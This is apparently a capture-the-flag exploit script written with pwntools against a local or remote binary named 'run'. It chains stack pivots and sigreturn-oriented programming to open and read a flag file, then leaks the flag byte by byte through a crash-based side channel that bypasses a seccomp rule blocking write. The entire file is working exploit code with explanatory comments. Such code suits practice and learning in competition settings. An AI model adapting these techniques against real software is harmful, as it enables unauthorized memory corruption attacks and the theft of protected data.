from pwn import *
import binascii

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
set follow-fork-mode child
'''.format(**locals())

exe = './run'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'critical'
context(terminal=['tmux', 'split-window', '-h'])

# -------------------------- EXPLOIT -----------------------------------------
# We are going to exploit it in 3 stages. First stage is opening the flag, second stage is reading the flag to bss, last stage is leaking the flag. 
# We are going to leak it because write is blocked. We are going to use srop to achieve this.

read = 0x401017 # mov edx, 0x50; xor esi, esi; xchg esi, edi; lea rsi, [rbp - 0x40]; mov eax, 0; syscall;
syscall = 0x40102a # syscall; leave; ret; 
bss = 0x402030 # bss + 0x30
main = 0x40100f # main address
leave = 0x40102c # leave; ret;
offset = 0x40
flaglocation = bss + 0x300

# -------------------------- STAGE 1 -----------------------------------------
# We are going to open the flag in this stage. The fd will be 3 locally. It can be different(depends on your machine ig). It can also differs on remote.

def stage1_open(io):
    # Pivot stack to bss
    payload = flat (
        b'\x00' * 64,
        bss + 64,
        read
        )

    io.send(payload)

    # Setup frame for srop
    pathname = bss + 0x180 - 0x30

    # open('flag.txt', O_RDONLY)
    frame = SigreturnFrame()
    frame.rip = syscall
    frame.rax = 0x2 # open syscall number
    frame.rdi = pathname # flag.txt string location in bss
    frame.rsi = 0x0
    frame.rdx = 0x0
    frame.rbp = bss # rbp pointing to bss

    frame_payload = p64(bss + 0x10) + p64(read) + b'\x00' * (64 - 16) + b'\x00' * 8 + p64(syscall) + bytes(frame)
    frame_payload += b'\x00' * (offset - (len(frame_payload) % offset))
    frame_payload += b'./flag.txt\x00' + b'\x00' * (offset - (len(frame_payload) % offset))

    for i in range(len(frame_payload) // offset):
        payload = flat(
            frame_payload[offset*i:offset*(i+1)],
            0x402040+(0x40*(i+1)),
            read
            )
        io.send(payload)

    # Fix rsp with pivoting pointing it to bss, bss + 8 will point to read so we call read again.
    payload = flat (
        b'\x00' * 64,
        bss,
        leave
        )

    io.send(payload)

    # Send 15 bytes to read to set rax to 0xf. So we can trigger sigreturn
    io.send(b'a' * 0xf)

# -------------------------- STAGE 2 -----------------------------------------
# We are going read the flag from the fd to a location in bss

def stage2(io):
    # Pivot stack to bss
    payload = flat (
        b'\x00' * 64,
        bss + 64,
        read
        )

    io.send(payload)

    # read(fd(3), bss + offset, size(20))
    frame = SigreturnFrame()
    frame.rip = syscall
    frame.rax = 0x0 # read syscall number
    frame.rdi = 0x3 # fd of open()
    frame.rsi = flaglocation # address where we will write the flag
    frame.rdx = 0x14 # size of flag(we dont know it so we guess 20)
    frame.rbp = bss # rbp pointing to bss

    frame_payload = p64(bss + 0x10) + p64(read) + b'\x00' * (64 - 16) + b'\x00' * 8 + p64(syscall) + bytes(frame)
    frame_payload += b'\x00' * (offset - (len(frame_payload) % offset))

    for i in range(len(frame_payload) // offset):
        payload = flat(
            frame_payload[offset*i:offset*(i+1)],
            0x402040+(0x40*(i+1)),
            read
            )
        io.send(payload)

    # Fix rsp with pivoting pointing to bss + 8, bss + 8 will be pointing to read again. 
    payload = flat (
        b'\x00' * 64,
        bss,
        leave
        )

    io.send(payload)

    # Send 15 bytes to read to set rax to 0xf. So we can trigger sigreturn
    io.send(b'a' * 0xf)

# -------------------------- STAGE 3 -----------------------------------------
# We are going to leak the flag 

# [0x30/48, 0x39/57] = digits(0,9)
# [0x61/97, 0x7A/122] = lowercase
# [0x7d/125] = }

# We know prefix starts with "CSCTF{", so we can skip the first 6 chars.

# In this stage we will call open for the last time in the function "stage3_open_leak()". Here we put the flag address in rdi, and 0x2 in rdx. 
# We do this to keep those values in the registers, so when the sigreturn and the open call is executed it will jump to the leakgadget with those values in the registers.

# We also write bss and syscall address after the flag. This so that the program don't crash. After the read call with our registers we specified, it will jump to syscall call. 
# That will be used to leak. read(flag, mem, 0x2) will be called. If the rdi/flag/fd value will be correct, read returns 0x2 in rax. Otherwise 0xff..(error value). 
# Now based on how we setup bss(fake stack) it will call syscall again. If rax is set to 0x2, because of succesfull leak, it will continue execution.
# Now if rax isn't 0x2 but some error value it will fail and crash the program(sigsys). We use 0x2(open) because 0x1(write) is blocked by seccomp, also because 1 char in hex is 2 for example: "}" is 0x7d/7d. 
# We leak and if we found something or we didn't we close the program. We do this because of how much we call open() our fd will increase. 
# Let's say fd is 0x10 and if that is wrong or correct, when we open again it increases to 0x11. 


def stage3_open_leak(io, counter):
    leakgadget = 0x40102e # movzx rdi, byte ptr [rsi]; ret;
    movrax = 0x401025 # mov eax, 0; syscall;

    # Pivot stack to bss
    payload = flat (
        b'\x00' * 64,
        bss + 64,
        read
        )

    io.send(payload)

    # Setup frame for srop
    pathname = bss + 0x180 - 0x30

    # This open will fail but it doesn't matter. We only do this because we need values in some registers.
    # open('flag.txt', O_RDONLY)
    frame = SigreturnFrame()
    frame.rip = syscall
    frame.rax = 0x2 # open sycall number
    frame.rdi = pathname # flag.txt string location in bss
    frame.rsi = flaglocation + counter # This will be put in rdi later for the leak. Its the flag address. We use the counter here to increase the address so we can leak byte by byte
    frame.rdx = 0x2 # This will be the size we will leak. 
    frame.rbp = bss + 0x160 # This will point to bss+0x178(you can see below) for the leak and set rip to the leakgadget.

    frame_payload = p64(bss + 0x10) + p64(read) + b'\x00' * (64 - 16) + b'\x00' * 8 + p64(syscall) + bytes(frame)
    frame_payload += b'\x00' * (offset - (len(frame_payload) % offset))
    frame_payload += b'./flag.txt' + b'\x00' * 6 + p64(bss+0x178) + p64(leakgadget) + p64(movrax) + p64(bss) + p64(syscall)
    frame_payload += b'\x00' * (offset - (len(frame_payload) % offset))

    for i in range(len(frame_payload) // offset):
        payload = flat(
            frame_payload[offset*i:offset*(i+1)],
            0x402040+(0x40*(i+1)),
            read
            )
        io.send(payload)

    # Fix rsp with pivoting pointing it to bss, bss + 8 will point to read so we call read again.
    payload = flat (
        b'\x00' * 64,
        bss,
        leave
        )

    io.send(payload)

    # Send 15 bytes to read to set rax to 0xf. So we can trigger sigreturn
    io.send(b'a' * 0xf)

def is_connection_alive(io):
    try:
        # for i in range(1):
        #     stage1_open(io)
        #     sleep(0.8)
        #     print("check")
        #     print(i)
        io.recv(timeout=0.4)
        return True
    except:
        return False

flagchars = [48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 125]

def create_flag_array():
    digits = string.digits
    lowercase = string.ascii_lowercase

    for i in digits:
        flagchars.append((ord(i)))
    for i in lowercase:
        flagchars.append((ord(i)))

    flagchars.append(ord("}"))

flag = ""
counter = 6
r = 0

def stage3(io):
    global flag
    global counter
    global r

    if r > len(flagchars):
        r = 0

    try:
        print(f"Trying {hex(flagchars[r])}")
        # We do "X - 3" where X is the value we want as fd, because 0x0, 0x1 and 0x2 are preserved for stdin, stdout, stderr. So it will start at 0x3. We already called open once in stage 1 so we substract 3 now.
        for i in range(flagchars[r] - 3): 
            stage1_open(io) 
            sleep(0.8)
        stage3_open_leak(io, counter)
        sleep(0.4)

        if is_connection_alive(io):
            flag += str(hex(flagchars[r])[2:])
            print(f"Found char: {str(hex(flagchars[r])[2:])}/{str(chr(flagchars[r]))}")
            print(f"Flag: {binascii.unhexlify(flag).decode()}")

            if not flag.endswith("7d"):
                counter += 1
                r = 0
                io.close()
                main()
            else:
                print(f"We got the flag: CSCTF{{{binascii.unhexlify(flag[:-2]).decode()}}}")
                io.close()
        else:
            r += 1
            main()
    except:
        r += 1
        main()

def main():
    io = start()
    # create_flag_array()
    stage1_open(io)
    sleep(0.5)
    stage2(io)
    sleep(0.5)
    stage3(io)
    io.close()

if __name__ == '__main__':
    main()
